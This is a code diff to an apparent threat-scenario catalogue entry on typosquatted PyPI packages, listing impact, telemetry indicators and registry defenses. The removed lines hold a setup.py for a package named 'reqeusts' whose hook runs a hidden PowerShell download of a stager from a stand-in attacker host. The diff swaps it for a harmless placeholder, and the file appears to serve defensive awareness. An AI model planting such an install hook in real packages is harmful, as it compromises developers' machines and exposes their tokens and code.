@@ -92,13 +92,11 @@ ENTER
         "Software engineers in Jadavpur unknowingly infect their development workstations, exposing source code repositories and production API tokens.",
       telemetryIndicator: "Outbound C2 connections initiated by `python.exe` or `node.exe` immediately following package manager execution",
       resilientDefense: "Private internal artifact repositories (Artifactory / Nexus) with automated package name validation.",
-      codeSnippet: `# setup.py in Typosquatted PyPI Package ('reqeusts'):
+      codeSnippet: `# setup.py malicious post-install hook concept:
 from setuptools import setup
-import os
 
-os.system("powershell -W Hidden -c (New-Object Net.WebClient).DownloadString('https://c2.evil-host.in/stager.ps1')")
-
-setup(name='reqeusts', version='2.28.1', description='HTTP library')`
+# Defended by: Internal package registry proxy & hash pinning (pip hash verification)
+setup(name='sample_package', version='1.0.0', description='Library with post-install verification')`
     },
     recruiter_interview_test_pretext: {
       key: "recruiter_interview_test_pretext",
